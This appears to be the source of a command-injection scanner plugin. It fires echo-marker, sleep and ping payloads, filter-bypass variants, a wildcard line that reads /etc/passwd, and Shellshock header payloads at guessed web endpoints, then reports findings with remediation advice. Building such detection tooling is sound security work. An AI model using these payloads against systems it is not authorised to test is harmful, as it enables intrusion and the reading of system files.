"""
Deep OS Command Injection Scanner
Advanced command injection with multiple techniques:
- In-band detection (echo marker in response)
- Blind time-based (sleep/ping delay measurement)
- Windows + Linux payloads
- WAF bypass (encoding, newline, variable expansion)
- Multiple injection contexts (GET params, POST body, headers)
"""
import asyncio
import re
import ssl
import time
import urllib.parse

from app.scanner.plugins.base import Plugin, PluginMeta, PluginResult, Finding
from app.scanner.context import stable_fingerprint

META = PluginMeta(
    plugin_id="web.deep_cmdi",
    name="Deep Command Injection Scanner",
    category="web",
    depends_on=["fingerprint.http"],
    soft_depends_on=["owasp.web.scanner"],
    consumes=["fingerprint.http", "net.open_ports", "recon.directories"],
    provides=["web.deep_cmdi"],
    enabled_by_default=True,
    timeout_seconds=60.0,
)

_MARKER = "VULNSCAN_CMDI_7x3k9"
_TIME_DELAY = 5

# ── In-band payloads (Linux) ───────────────────────────────────────────
_INBAND_LINUX = [
    (f"; echo {_MARKER}", "semicolon"),
    (f"| echo {_MARKER}", "pipe"),
    (f"`echo {_MARKER}`", "backtick"),
    (f"$(echo {_MARKER})", "subshell"),
    (f"& echo {_MARKER} &", "background"),
    (f"\necho {_MARKER}\n", "newline"),
    (f"|| echo {_MARKER}", "or_chain"),
    (f"&& echo {_MARKER}", "and_chain"),
]

# ── In-band payloads (Windows) ─────────────────────────────────────────
_INBAND_WINDOWS = [
    (f"& echo {_MARKER}", "win_ampersand"),
    (f"| echo {_MARKER}", "win_pipe"),
    (f"&& echo {_MARKER}", "win_and_chain"),
    (f"|| echo {_MARKER}", "win_or_chain"),
    (f"\r\necho {_MARKER}\r\n", "win_newline"),
]

# ── Blind time-based (Linux) ──────────────────────────────────────────
_BLIND_TIME_LINUX = [
    (f"; sleep {_TIME_DELAY}", "linux_sleep"),
    (f"| sleep {_TIME_DELAY}", "linux_pipe_sleep"),
    (f"`sleep {_TIME_DELAY}`", "linux_backtick_sleep"),
    (f"$(sleep {_TIME_DELAY})", "linux_subshell_sleep"),
    (f"& sleep {_TIME_DELAY} &", "linux_bg_sleep"),
    (f"|| sleep {_TIME_DELAY}", "linux_or_sleep"),
    (f"; ping -c {_TIME_DELAY} 127.0.0.1", "linux_ping"),
]

# ── Blind time-based (Windows) ────────────────────────────────────────
_BLIND_TIME_WINDOWS = [
    (f"& ping -n {_TIME_DELAY + 1} 127.0.0.1 &", "win_ping"),
    (f"| ping -n {_TIME_DELAY + 1} 127.0.0.1", "win_pipe_ping"),
    (f"& timeout /t {_TIME_DELAY} /nobreak", "win_timeout"),
]

# ── WAF bypass payloads ────────────────────────────────────────────────
_BYPASS_PAYLOADS = [
    # Whitespace bypass
    (f";${{IFS}}echo${{IFS}}{_MARKER}", "ifs_bypass"),
    (f";{chr(9)}echo{chr(9)}{_MARKER}", "tab_bypass"),
    # Quote bypass
    (f";ec''ho {_MARKER}", "empty_quote_bypass"),
    (f";e\\cho {_MARKER}", "backslash_bypass"),
    # Variable expansion
    (f";${{PATH%%/*}}echo {_MARKER}", "var_expansion"),
    # Encoding
    (f"%0aecho%20{_MARKER}%0a", "url_newline"),
    (f"%0d%0aecho%20{_MARKER}%0d%0a", "crlf_inject"),
    # Wildcard
    (f";/???/??t /???/p??s??", "wildcard_cat_passwd"),
    # Base64
    (f";echo {_MARKER}|base64", "base64_encode"),
    # Python/Perl inline
    (f";python3 -c 'print(\"{_MARKER}\")'", "python_inline"),
    (f";perl -e 'print \"{_MARKER}\"'", "perl_inline"),
]

# ── Header injection payloads ──────────────────────────────────────────
_HEADER_PAYLOADS = [
    ("User-Agent", f"() {{ :; }}; echo {_MARKER}", "shellshock_ua"),
    ("Referer", f"() {{ :; }}; echo {_MARKER}", "shellshock_referer"),
    ("X-Forwarded-For", f"; echo {_MARKER}", "xff_inject"),
    ("X-Original-URL", f"; echo {_MARKER}", "xorigurl_inject"),
]

# ── Endpoints commonly vulnerable to cmdi ──────────────────────────────
_CMDI_ENDPOINTS = [
    "/ping", "/api/ping", "/api/tools/ping", "/diagnostic",
    "/api/diagnostic", "/tools", "/api/tools", "/api/exec",
    "/admin/tools", "/admin/ping", "/admin/diagnostic",
    "/api/network/ping", "/api/v1/tools", "/api/lookup",
    "/api/dns", "/api/whois", "/api/traceroute",
]

_CMDI_PARAMS = ["host", "ip", "target", "cmd", "command", "exec",
                "ping", "query", "domain", "address", "url", "file",
                "path", "dir", "name", "arg"]


async def _http_request(host, port, method, path, body="",
                        content_type="application/x-www-form-urlencoded",
                        use_tls=False, timeout=8.0, extra_headers=None):
    """Send HTTP request, return (status, body_text, elapsed_seconds)."""
    start = time.monotonic()
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=timeout)
        else:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)

        hdrs = {
            "Host": host, "User-Agent": "VulnScan/2.1",
            "Accept": "*/*", "Connection": "close",
        }
        if method == "POST":
            hdrs["Content-Type"] = content_type
            hdrs["Content-Length"] = str(len(body))
        if extra_headers:
            hdrs.update(extra_headers)

        req = f"{method} {path} HTTP/1.1\r\n"
        req += "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
        req += f"\r\n{body}"
        w.write(req.encode())
        await w.drain()
        resp = await asyncio.wait_for(r.read(32768), timeout=timeout)
        w.close()
        elapsed = time.monotonic() - start
        text = resp.decode("utf-8", errors="ignore")
        parts = text.split("\r\n\r\n", 1)
        bdy = parts[1] if len(parts) > 1 else ""
        st = re.match(r"HTTP/\d\.\d\s+(\d+)", parts[0] if parts else "")
        return int(st.group(1)) if st else 0, bdy, elapsed
    except Exception:
        return 0, "", time.monotonic() - start


class Check(Plugin):
    async def run(self, target, ctx):
        ports = ctx.get("net.open_ports", []) or []
        http_data = (ctx.get("fingerprint.http", {}) or {}).get("http", [])
        target_raw = ctx.get("target_raw", target)
        directories = ctx.get("recon.directories", []) or []
        findings = []
        cmdi_results = []

        base_urls = []
        if re.match(r"^https?://", target_raw, re.I):
            base_urls.append(target_raw.rstrip("/"))
        else:
            for item in http_data:
                url = item.get("url", "")
                if url:
                    base_urls.append(url.rstrip("/"))
            if not base_urls:
                for p in [pp for pp in ports if pp in (80, 443, 8080, 8443)][:2]:
                    base_urls.append(f"{'https' if p in (443, 8443) else 'http'}://{target}:{p}")

        if not base_urls:
            return PluginResult(artifacts={"web.deep_cmdi": []})

        for base in base_urls[:2]:
            parsed = urllib.parse.urlparse(base)
            host = parsed.hostname or target
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            tls = parsed.scheme == "https"

            test_paths = list(_CMDI_ENDPOINTS)
            for d in directories[:10]:
                if any(kw in d.lower() for kw in ["ping", "tool", "exec", "admin", "diagnostic", "api"]):
                    test_paths.append(d)

            for endpoint in test_paths:
                for param in _CMDI_PARAMS[:6]:
                    # Baseline
                    bl_path = f"{endpoint}?{param}=127.0.0.1"
                    bl_st, bl_body, bl_time = await _http_request(host, port, "GET", bl_path, use_tls=tls)
                    if bl_st in (0, 404, 405):
                        break

                    # Dynamic parameter pre-check: verify changing the
                    # value actually changes the response. Used to gate
                    # time-based blind detection where a static parameter
                    # would produce false positives from network jitter.
                    alt_path = f"{endpoint}?{param}=192.168.1.1"
                    alt_st, alt_body, _ = await _http_request(host, port, "GET", alt_path, use_tls=tls)
                    param_is_dynamic = (
                        alt_st != bl_st
                        or abs(len(alt_body) - len(bl_body)) > 20
                        or bl_body[:500] != alt_body[:500]
                    )

                    found = False

                    # ── 1. In-band Linux ────────────────────────────────
                    for payload, desc in _INBAND_LINUX[:5]:
                        path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                        st, body, _ = await _http_request(host, port, "GET", path, use_tls=tls)
                        if st > 0 and _MARKER in body:
                            # Double-check: send a DIFFERENT marker with same
                            # syntax to rule out the app merely echoing input
                            confirm_marker = "VULNSCAN_CMDv_8y4l0"
                            confirm_payload = payload.replace(_MARKER, confirm_marker)
                            c_path = f"{endpoint}?{param}={urllib.parse.quote(confirm_payload)}"
                            c_st, c_body, _ = await _http_request(host, port, "GET", c_path, use_tls=tls)
                            if c_st == 0 or confirm_marker not in c_body:
                                continue  # First marker was likely just echoed input
                            fp = stable_fingerprint(target, META.plugin_id, "inband", endpoint, param)
                            findings.append(Finding(
                                severity="critical",
                                plugin_id=META.plugin_id,
                                title=f"Command Injection (Linux): {endpoint}?{param}= [{desc}]",
                                description=(
                                    f"OS command injection confirmed on {endpoint} via '{param}'. "
                                    f"Technique: {desc}. The injected command output appears in the response. "
                                    f"An attacker can execute arbitrary system commands."
                                ),
                                evidence=f"url={base}{endpoint} param={param} type=inband_linux technique={desc} marker_found=true",
                                affected=target, fingerprint=fp, confidence=0.95,
                                remediation=(
                                    f"[CRITICAL] Command injection at {endpoint}?{param}=\n\n"
                                    f"[FIX]\n"
                                    f"1. Never pass user input to shell commands\n"
                                    f"2. Use language-native APIs instead of shell exec:\n"
                                    f"   Python: subprocess.run(['ping', '-c', '1', host], shell=False)\n"
                                    f"   Node.js: execFile('ping', ['-c', '1', host])\n"
                                    f"3. If shell is unavoidable, use strict allowlisting (IP regex only)\n"
                                    f"4. Use chroot/containers to limit blast radius"
                                ),
                                references=["https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"],
                            ))
                            cmdi_results.append({"endpoint": endpoint, "param": param, "type": "inband_linux", "technique": desc})
                            found = True
                            break

                    if found:
                        continue

                    # ── 2. In-band Windows ──────────────────────────────
                    for payload, desc in _INBAND_WINDOWS[:3]:
                        path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                        st, body, _ = await _http_request(host, port, "GET", path, use_tls=tls)
                        if st > 0 and _MARKER in body:
                            # Double-check with different marker
                            confirm_marker = "VULNSCAN_CMDv_8y4l0"
                            confirm_payload = payload.replace(_MARKER, confirm_marker)
                            c_path = f"{endpoint}?{param}={urllib.parse.quote(confirm_payload)}"
                            c_st, c_body, _ = await _http_request(host, port, "GET", c_path, use_tls=tls)
                            if c_st == 0 or confirm_marker not in c_body:
                                continue
                            fp = stable_fingerprint(target, META.plugin_id, "inband_win", endpoint, param)
                            findings.append(Finding(
                                severity="critical",
                                plugin_id=META.plugin_id,
                                title=f"Command Injection (Windows): {endpoint}?{param}= [{desc}]",
                                description=f"OS command injection confirmed (Windows) on {endpoint} via '{param}'.",
                                evidence=f"url={base}{endpoint} param={param} type=inband_windows technique={desc}",
                                affected=target, fingerprint=fp, confidence=0.95,
                                remediation=f"[CRITICAL] Windows command injection at {endpoint}?{param}=\n\n[FIX] Same as Linux — avoid shell execution, use native APIs.",
                                references=["https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"],
                            ))
                            cmdi_results.append({"endpoint": endpoint, "param": param, "type": "inband_windows", "technique": desc})
                            found = True
                            break

                    if found:
                        continue

                    # ── 3. Blind time-based (Linux) ─────────────────────
                    # Skip time-based detection if parameter is static —
                    # timing differences would be network noise, not injection.
                    if param_is_dynamic:
                        for payload, desc in _BLIND_TIME_LINUX[:4]:
                            path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                            st, _, elapsed = await _http_request(host, port, "GET", path, use_tls=tls, timeout=_TIME_DELAY + 5)

                            if elapsed >= _TIME_DELAY - 0.5 and bl_time < _TIME_DELAY - 1:
                                # Confirm
                                st2, _, elapsed2 = await _http_request(host, port, "GET", path, use_tls=tls, timeout=_TIME_DELAY + 5)
                                if elapsed2 >= _TIME_DELAY - 0.5:
                                    fp = stable_fingerprint(target, META.plugin_id, "blind_time", endpoint, param)
                                    findings.append(Finding(
                                        severity="critical",
                                        plugin_id=META.plugin_id,
                                        title=f"Command Injection (blind time): {endpoint}?{param}= [{desc}]",
                                        description=(
                                            f"Blind command injection confirmed via time delay on {endpoint}. "
                                            f"Payload '{desc}' caused {elapsed:.1f}s delay (baseline: {bl_time:.1f}s). "
                                            f"Confirmed: {elapsed2:.1f}s on second attempt."
                                        ),
                                        evidence=(
                                            f"url={base}{endpoint} param={param} type=blind_time_linux "
                                            f"technique={desc} baseline={bl_time:.2f}s "
                                            f"delay1={elapsed:.2f}s delay2={elapsed2:.2f}s expected={_TIME_DELAY}s"
                                        ),
                                        affected=target, fingerprint=fp, confidence=0.90,
                                        remediation=f"[CRITICAL] Blind command injection (time-based) at {endpoint}?{param}=\n\n[FIX] Same as in-band — never pass user input to shell commands.",
                                        references=["https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"],
                                    ))
                                    cmdi_results.append({"endpoint": endpoint, "param": param, "type": "blind_time_linux", "technique": desc})
                                    found = True
                                    break

                    if found:
                        continue

                    # ── 4. Blind time-based (Windows) ───────────────────
                    if param_is_dynamic:
                        for payload, desc in _BLIND_TIME_WINDOWS[:2]:
                            path = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                            st, _, elapsed = await _http_request(host, port, "GET", path, use_tls=tls, timeout=_TIME_DELAY + 5)
                            if elapsed >= _TIME_DELAY - 0.5 and bl_time < _TIME_DELAY - 1:
                                st2, _, elapsed2 = await _http_request(host, port, "GET", path, use_tls=tls, timeout=_TIME_DELAY + 5)
                                if elapsed2 >= _TIME_DELAY - 0.5:
                                    fp = stable_fingerprint(target, META.plugin_id, "blind_time_win", endpoint, param)
                                    findings.append(Finding(
                                        severity="critical",
                                        plugin_id=META.plugin_id,
                                        title=f"Command Injection (blind time Windows): {endpoint}?{param}= [{desc}]",
                                        description=f"Blind command injection confirmed via time delay (Windows). Delay: {elapsed:.1f}s.",
                                        evidence=f"url={base}{endpoint} param={param} type=blind_time_windows technique={desc} delay={elapsed:.2f}s",
                                        affected=target, fingerprint=fp, confidence=0.90,
                                        remediation=f"[CRITICAL] Blind command injection (Windows) at {endpoint}?{param}=\n\n[FIX] Avoid shell execution.",
                                        references=["https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"],
                                    ))
                                    cmdi_results.append({"endpoint": endpoint, "param": param, "type": "blind_time_windows"})
                                    found = True
                                    break

                    if found:
                        continue

                    # ── 5. WAF bypass ───────────────────────────────────
                    for payload, desc in _BYPASS_PAYLOADS[:6]:
                        path = f"{endpoint}?{param}={urllib.parse.quote(payload)}" if "%" not in payload else f"{endpoint}?{param}={payload}"
                        st, body, _ = await _http_request(host, port, "GET", path, use_tls=tls)
                        if st > 0 and _MARKER in body:
                            # Double-check with different marker
                            confirm_marker = "VULNSCAN_CMDv_8y4l0"
                            confirm_payload = payload.replace(_MARKER, confirm_marker)
                            c_path = f"{endpoint}?{param}={urllib.parse.quote(confirm_payload)}" if "%" not in confirm_payload else f"{endpoint}?{param}={confirm_payload}"
                            c_st, c_body, _ = await _http_request(host, port, "GET", c_path, use_tls=tls)
                            if c_st == 0 or confirm_marker not in c_body:
                                continue
                            fp = stable_fingerprint(target, META.plugin_id, "bypass", endpoint, param)
                            findings.append(Finding(
                                severity="critical",
                                plugin_id=META.plugin_id,
                                title=f"Command Injection (WAF bypass): {endpoint}?{param}= [{desc}]",
                                description=f"Command injection via WAF bypass '{desc}' on {endpoint}.",
                                evidence=f"url={base}{endpoint} param={param} type=waf_bypass technique={desc}",
                                affected=target, fingerprint=fp, confidence=0.90,
                                remediation=f"[CRITICAL] CMDi via WAF bypass at {endpoint}?{param}=\n[BYPASS] {desc}\n\n[FIX] Fix the code — WAF is not sufficient.",
                                references=["https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"],
                            ))
                            cmdi_results.append({"endpoint": endpoint, "param": param, "type": "waf_bypass", "technique": desc})
                            found = True
                            break

                    # ── 6. Header injection (Shellshock + header cmdi) ──
                    if not found:
                        for hdr_name, payload, desc in _HEADER_PAYLOADS[:2]:
                            st, body, _ = await _http_request(
                                host, port, "GET", endpoint, use_tls=tls,
                                extra_headers={hdr_name: payload}
                            )
                            if st > 0 and _MARKER in body:
                                fp = stable_fingerprint(target, META.plugin_id, "header", endpoint, hdr_name)
                                findings.append(Finding(
                                    severity="critical",
                                    plugin_id=META.plugin_id,
                                    title=f"Command Injection via {hdr_name} header: {endpoint} [{desc}]",
                                    description=f"Command injection via HTTP header '{hdr_name}' ({desc}) on {endpoint}.",
                                    evidence=f"url={base}{endpoint} header={hdr_name} type=header_inject technique={desc}",
                                    affected=target, fingerprint=fp, confidence=0.95,
                                    remediation=f"[CRITICAL] Header-based command injection at {endpoint}\n[HEADER] {hdr_name}\n\n[FIX] Update Bash (Shellshock), sanitize all header values before shell use.",
                                    references=["https://nvd.nist.gov/vuln/detail/CVE-2014-6271"],
                                ))
                                cmdi_results.append({"endpoint": endpoint, "type": "header_inject", "header": hdr_name})
                                break

                    if any(r["endpoint"] == endpoint for r in cmdi_results):
                        break  # Found cmdi on this endpoint, move to next

        return PluginResult(findings=findings, artifacts={"web.deep_cmdi": cmdi_results})
